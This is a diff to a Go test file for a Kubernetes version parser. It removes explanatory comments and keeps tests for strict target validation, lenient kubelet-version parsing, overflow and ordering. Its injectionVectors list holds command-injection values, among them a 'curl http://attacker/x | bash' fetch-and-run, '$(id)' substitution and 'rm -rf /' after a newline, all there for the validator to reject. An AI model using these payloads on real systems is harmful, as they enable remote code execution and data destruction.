@@ -2,18 +2,15 @@ package k8sver
 
 import "testing"
 
-// injectionVectors are the payload classes this package exists to reject as
-// targets. Every one of them must be refused before it reaches a shell or a
-// node annotation.
 var injectionVectors = []string{
 	"v1.36.2; curl http://attacker/x | bash",
-	"v1.36; curl http://attacker/x | bash", // two-component variant
+	"v1.36; curl http://attacker/x | bash",
 	"v1.36.$(id)",
 	"v1.36.2`id`",
 	"v1.36.2 && id",
-	"v1.36.2\nrm -rf /", // anchors must not let $ match before a newline
+	"v1.36.2\nrm -rf /",
 	"v1.36.2\trm -rf /",
-	"v1.36.2 --skip-snapshot", // argument smuggling, not shell
+	"v1.36.2 --skip-snapshot",
 }
 
 func TestValidTargetAcceptsExactSemver(t *testing.T) {
@@ -36,20 +33,20 @@ func TestValidTargetRejectsNonExactForms(t *testing.T) {
 	for _, v := range []string{
 		"",
 		"garbage",
-		"1.36.2",           // no leading v
-		"v1.36",            // no patch
-		"v1",               //
-		"v1.36.2+build",    // build metadata is fine on a NODE, never on a target
-		"v1.31.2+k3s1",     //
-		"v1.28.3-eks-a1b2", //
-		"v01.36.2",         // leading zero must not alias v1.36.2
-		"v1.036.2",         //
-		"v1.36.02",         //
-		"v-1.36.2",         //
-		" v1.36.2",         // surrounding whitespace
-		"v1.36.2 ",         //
-		"vv1.36.2",         //
-		"v1.36.2.3",        //
+		"1.36.2",
+		"v1.36",
+		"v1",
+		"v1.36.2+build",
+		"v1.31.2+k3s1",
+		"v1.28.3-eks-a1b2",
+		"v01.36.2",
+		"v1.036.2",
+		"v1.36.02",
+		"v-1.36.2",
+		" v1.36.2",
+		"v1.36.2 ",
+		"vv1.36.2",
+		"v1.36.2.3",
 	} {
 		if ValidTarget(v) {
 			t.Errorf("ValidTarget(%q) = true, want false", v)
@@ -58,9 +55,6 @@ func TestValidTargetRejectsNonExactForms(t *testing.T) {
 }
 
 func TestParseAcceptsRealKubeletVersions(t *testing.T) {
-	// Regression guard for the failure mode that makes a strict parser here
-	// dangerous: when these stop parsing, callers lose their watermarks and skip
-	// their downgrade and skew gates entirely.
 	tests := []struct {
 		in   string
 		want Version
@@ -91,14 +85,6 @@ func TestParseRejectsUnusable(t *testing.T) {
 	}
 }
 
-// Parse must STAY lenient. This is the invariant that keeps callers' downgrade
-// and version-skew gates armed: those gates are guarded on a successfully
-// parsed node version, so a Parse that started rejecting real kubelet strings
-// would silently disable them rather than reject anything.
-//
-// Asserted over the kubelet corpus, not the injection corpus — Parse's verdict
-// on an injection payload is deliberately unconstrained, because ValidTarget /
-// ParseTarget is what gates untrusted input.
 func TestParseStaysLenientForKubeletVersions(t *testing.T) {
 	for _, v := range []string{
 		"v1.36.2", "1.36", "v1.36.2+build", "v1.31.2+k3s1",
@@ -114,8 +100,6 @@ func TestParseStaysLenientForKubeletVersions(t *testing.T) {
 }
 
 func TestMajorIsNotDiscarded(t *testing.T) {
-	// Parse must not discard the major: v99.36.2 and v0.36.2 both carry
-	// minor 36, but they are not the same cluster's Kubernetes.
 	for _, tt := range []struct {
 		in    string
 		major int
@@ -127,8 +111,6 @@ func TestMajorIsNotDiscarded(t *testing.T) {
 	}
 }
 
-// A component can satisfy the pattern and still overflow an int, so ValidTarget
-// alone is not sufficient to trust Parse's numbers. ParseTarget reports both.
 func TestParseTargetRejectsOverflowThatValidTargetAccepts(t *testing.T) {
 	for _, v := range []string{
 		"v99999999999999999999.1.1",
@@ -162,19 +144,12 @@ func TestParseTargetAgreesWithValidTargetOnNormalInput(t *testing.T) {
 	}
 }
 
-// ParseTarget indexes TargetPattern's capture groups positionally, and
-// TargetPattern is exported precisely so it can be edited in lockstep with the
-// CRD. Pin the group count so an edit that adds or removes one fails here
-// rather than silently remapping major/minor/patch.
 func TestTargetPatternHasExactlyThreeGroups(t *testing.T) {
 	if n := targetRe.NumSubexp(); n != 3 {
 		t.Fatalf("TargetPattern has %d capture groups, want 3 — ParseTarget indexes them positionally", n)
 	}
 }
 
-// The downgrade gate orders whole versions, so Compare must not stop at the
-// minor. v1.36.1 < v1.36.2 is the case that a major/minor-only comparison
-// silently called "equal", letting a patch downgrade through.
 func TestCompareOrdersOnAllThreeComponents(t *testing.T) {
 	tests := []struct {
 		a, b string
@@ -202,8 +177,6 @@ func TestCompareOrdersOnAllThreeComponents(t *testing.T) {
 	}
 }
 
-// Parse must read the patch off real kubelet strings too, or the downgrade gate
-// has nothing to compare against on the node side.
 func TestParseReadsPatchFromSuffixedVersions(t *testing.T) {
 	for _, tt := range []struct {
 		in   string
@@ -213,8 +186,8 @@ func TestParseReadsPatchFromSuffixedVersions(t *testing.T) {
 		{"v1.36.2+k3s1", Version{1, 36, 2}},
 		{"v1.28.3-eks-a1b2c3", Version{1, 28, 3}},
 		{"v1.30.0-gke.1449000", Version{1, 30, 0}},
-		{"1.36", Version{1, 36, 0}},    // absent patch reads as .0
-		{"v1.36.x", Version{1, 36, 0}}, // unreadable patch reads as .0
+		{"1.36", Version{1, 36, 0}},
+		{"v1.36.x", Version{1, 36, 0}},
 	} {
 		got, ok := Parse(tt.in)
 		if !ok || got != tt.want {
